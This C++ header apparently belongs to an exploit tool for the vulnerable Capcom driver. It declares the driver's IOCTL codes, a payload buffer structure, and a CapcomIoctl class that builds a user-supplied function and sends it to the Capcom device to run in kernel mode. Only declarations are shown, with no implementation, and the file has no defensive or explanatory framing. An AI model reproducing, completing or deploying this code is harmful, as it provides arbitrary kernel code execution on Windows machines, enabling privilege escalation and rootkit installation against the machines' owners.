#pragma once
 
#include <Windows.h>
#include <winternl.h>
 
#define IOCTL_X86           0xAA012044
#define IOCTL_X64           0xAA013044
#define PAYLOAD_BUFFER_SIZE 0x200
 
using fnMmGetSystemRoutineAddress   = PVOID(NTAPI*)(PUNICODE_STRING);
using fnCapcomRunFunc               = VOID(NTAPI*)(fnMmGetSystemRoutineAddress, PVOID);
 
struct CapcomCodePayload
{
    BYTE* PointerToPayload;                 // This points to the Payload member below
    BYTE  Payload[PAYLOAD_BUFFER_SIZE];     // Payload that is going to be executed
};
 
class CapcomIoctl
{
public:
    /// Arguments:
    ///     - UserFunction: The function that will be executed
    ///     - CustomData:   Pointer to custom data that will be sent to the function
    void Build(fnCapcomRunFunc UserFunction, PVOID UserData);
 
    void Free();
 
    /// Arguments:
    ///     - CapcomDevice: Handle to the Capcom device
    void Run(HANDLE CapcomDevice);
 
private:
    BYTE* PointerToPayload;  //This must point to CapcomCodePayload::Payload
};